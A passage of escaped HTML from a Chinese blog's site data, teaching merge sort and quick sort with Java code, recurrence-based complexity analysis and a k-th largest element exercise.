class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 归并排序</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    merge_sort(a, <span class=\"number\">0</span>, n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 递归终止条件</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p&gt;=r) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 获取分区点</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> q = p + (r-p)/<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序左边</span></span><br><span class=\"line\">    merge_sort(a, p, q);</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序右边</span></span><br><span class=\"line\">    merge_sort(a, q+<span class=\"number\">1</span>, r);</span><br><span class=\"line\">    <span class=\"comment\">// 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]</span></span><br><span class=\"line\">    merge(a, p, q, r);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 合并数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> q, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> j = q + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> k = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 合并数组 a[p, q]  a[q+1, r] 到临时数组temp</span></span><br><span class=\"line\">    <span class=\"comment\">// 申请一个临时数组</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span>[] temp = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[r - p + <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 根据两个数组最短的长度进行比较添加到temp中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (i&lt;=q&amp;&amp; j&lt;=r)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[i]&lt;=a[j])&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 看哪个数组还没有完成，将其放到temp后</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i&lt;=q)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;=q)&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (j&lt;=r)&#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.out.println(Arrays.toString(temp));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 将temp中对应的数据放入原数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt;= r-p; i++) &#123;</span><br><span class=\"line\">        a[p+i] = temp[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你可能已经发现了，merge(A[p…r], A[p…q], A[q+1…r])这个函数的作用就是，讲已经有序的A[p…q]和A[q+1…r]合并成另一个有序的数组，并且放入A[p…r]。那这个过程具体该怎么做呢？</p>\n<p>如图所示，我们申请一个临时数组temp，大小与A[p…r]相同。我们用两个指针i，j分别指向A[p…q]和A[q+1…r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。</p>\n<p>继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p…r]中。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的性能分析\"><a href=\"#归并排序的性能分析\" class=\"headerlink\" title=\"归并排序的性能分析\"></a>归并排序的性能分析</h3></div><br></div>\n\n<p>还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。</p>\n<p><strong>第一、 归并排序是稳定的排序算法吗？</strong></p>\n<p>结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。</p>\n<p>在合并的过程中，如果A[p…q]和A[q+1…r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p…q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。</p>\n<p><strong>第二、归并排序的时间复杂度是多少？</strong></p>\n<p>归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。</p>\n<p>在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。</p>\n<p>我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。</p>\n<p>从上面的分析，我们得出一个重要的结论：<strong>不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式</strong>。</p>\n<p>套用这个公式，我们来分析一下归并排序的时间复杂度。</p>\n<p>我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：<br>$$<br>\\begin{cases}<br>T(1) = C; &amp; n=1 \\\\[2ex]<br>T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程</p>\n<p>$$<br>\\begin{align*}<br>T(n) \\ &amp;= \\ 2*T(\\frac{n}{2}) \\ + \\ n \\\\[2ex]<br>&amp;= 2*(2 * T(\\frac{n}{4}) + \\frac{n}{2}) \\  + \\ n \\qquad = 4*T(\\frac{n}{4}) + 2*n \\\\[2ex]<br>&amp;= 4*(2* T(\\frac{n}{8}) + \\frac{n}{4}) \\  + \\ 2 * n \\ \\; = 8*T(\\frac{n}{8}) + 3*n \\\\[2ex]<br>&amp;= 8*(2* T(\\frac{n}{16}) + \\frac{n}{8}) \\  + \\ 3 * n \\ \\; = 16*T(\\frac{n}{16}) + 4*n \\\\[2ex]<br>&amp;= …… \\\\[2ex]<br>&amp;= 2^{k} * T(\\frac{n}{2^{k}}) + k * n<br>\\end{align*}<br>$$</p>\n<p>这样一步步推导，我们可以得到$T(n) \\ = \\ 2^{k} * T(\\frac{n}{2^{k}}) + k * n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\ = \\ Cn + n*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n*log_{2}n)$。所以归并排序的时间复杂度是$O(n*log_{2}n)$。</p>\n<p>从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n*log_{2}n)$。</p>\n<p><strong>第三、归并排序是不是原地排序算法呢？</strong></p>\n<p>归并排序的时间复杂度在任何情况下都是$O(n*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。</p>\n<p>这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n*log_{2}n)$，该如何分析呢？</p>\n<p>如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？</p>\n<p>实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的原理\"><a href=\"#快速排序的原理\" class=\"headerlink\" title=\"快速排序的原理\"></a>快速排序的原理</h3></div><br></div>\n\n<p>我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。</p>\n<p>快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。</p>\n<p>第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。</p>\n<p>根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。</p>\n<p>如果我们用递推公式来将上面的过程写出来的话，就是这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 递推公式</span><br><span class=\"line\">quick_sort(p...r) = quick_sort(p...q-<span class=\"number\">1</span>)+quick_sort(q+<span class=\"number\">1</span>...r)</span><br><span class=\"line\"></span><br><span class=\"line\"># 终止条件</span><br><span class=\"line\">p&gt;=r</span><br></pre></td></tr></table></figure>\n<p>我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (n &lt; <span class=\"number\">1</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    quickSort(arr, <span class=\"number\">0</span> , n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (left&gt;=right) <span class=\"keyword\">return</span>; </span><br><span class=\"line\">    <span class=\"keyword\">int</span> mid = partation(arr, left, right);</span><br><span class=\"line\">    quickSort(arr, left, mid-<span class=\"number\">1</span>);</span><br><span class=\"line\">    quickSort(arr, mid+<span class=\"number\">1</span>, right);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> base = arr[left];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left, j = right;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&lt;j)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[j] &gt;= base) j--;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;j &amp;&amp; arr[i] &lt;= base) i++;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i&lt;j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = arr[i];</span><br><span class=\"line\">            arr[i] = arr[j];</span><br><span class=\"line\">            arr[j] = temp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    arr[left] = arr[i];</span><br><span class=\"line\">    arr[i] = base;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 查找中间位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partation1</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> left, <span class=\"keyword\">int</span> right)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot = a[right];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = left;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j=left; j&lt;=right-<span class=\"number\">1</span>;j++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[j]&lt;pivot)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> temp = a[i];</span><br><span class=\"line\">            a[i] = a[j];</span><br><span class=\"line\">            a[j] = temp;</span><br><span class=\"line\">            i++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    a[right] = a[i];</span><br><span class=\"line\">    a[i] = pivot;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p…r]分区，函数返回pivot的小标。</p>\n<p>如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p…r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p…r]中。</p>\n<p>不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p…r]原地完成分区操作。</p>\n<p>原地分区函数的实现思路非常巧妙，我下面用伪代码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">partation(a,p,r)&#123;</span><br><span class=\"line\">    pivot := A[r]</span><br><span class=\"line\">    i := p;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j:=p to r-<span class=\"number\">1</span> <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> A[j] &lt; pivot&#123;</span><br><span class=\"line\">            swap A[i] with A[j]</span><br><span class=\"line\">            i := i+<span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    swap A[i] with A[r]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的处理有点类似于选择排序。我们通过游标i把A[p…r-1]分成了两部分，A[p…i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i…r-1] 是“未处理区间”。我们每次从未处理区间A[i…r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。</p>\n<p>数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。</p>\n<p>因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。</p>\n<p>到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？</p>\n<p>可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"快速排序的性能分析\"><a href=\"#快速排序的性能分析\" class=\"headerlink\" title=\"快速排序的性能分析\"></a>快速排序的性能分析</h3></div><br></div>\n\n<p>现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。</p>\n<p>快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n*log_{2}n)$。</p>\n<p>$$<br>\\begin{cases} \\\\<br>\\ T(1) = C; &amp; n=1 \\\\[2ex]<br>\\ T(n) = 2*T(\\frac{n}{2}) + n; &amp;  n&gt;1<br>\\end{cases}<br>$$</p>\n<p>但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。</p>\n<p>我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n*log_{2}n)$退化成了$O(n^2)$。</p>\n<p>我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？</p>\n<p>实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。</p>\n<p>我们选择数组区间A[p…r]最后一个元素A[n-1]作为pivot，对数组A[0…n-1]进行原地分区，这样数组就分成了三部分，A[0…p-1]、A[p]、A[p+1…n-1]。</p>\n<p>如果p+1=K，那么A[p]就是要求解的元素，如果K&gt;p+1，说明第K大元素出现在A[p+1…n-1]区间内，我们再按照上面的思路在A[p+1…n-1]内查找。同理，如果K&lt; p+1，那我们就在A[0…p-1]区间内查找。</p>\n<p>我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？</p>\n<p>第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16……直到区间缩小为1.</p>\n<p>如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+……+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。</p>\n<p>归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。</p>\n<p>快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？</p>\n<p>多路归并、外排序</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，<strong>归并排序</strong>和<strong>快速排序</strong>。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。</p>\n<p>归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：<strong>如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？</strong>，这就要用到今天讲的内容。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的原理\"><a href=\"#归并排序的原理\" class=\"headerlink\" title=\"归并排序的原理\"></a>归并排序的原理</h3></div><br></div>\n\n<p>我们先来看看<strong>归并排序</strong>。</p>\n<p>归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。</p>\n<img src=\"/posts/2018-09-23-算法-排序(中)/归并排序原理图.jpg\" title=\"归并排序原理图\">\n<p>归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。</p>\n<p>从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。<strong>分治是一种解决问题的处理思想，递归是一种编程技巧</strong>，这两者并不冲突。</p>\n<p>前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。</p>\n<p>我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">递推公式</span><br><span class=\"line\">merge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+<span class=\"number\">1</span>...r))</span><br><span class=\"line\"></span><br><span class=\"line\">终止条件</span><br><span class=\"line\">p&gt;=r 不在继续分解</span><br></pre></td></tr></table></figure>\n<p>我来解释一下这个公式，merge_sort(p…r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p…q)和merge_sort(q+1…r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。</p>\n<p>有了递推公式，转化成代码就简单多了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span 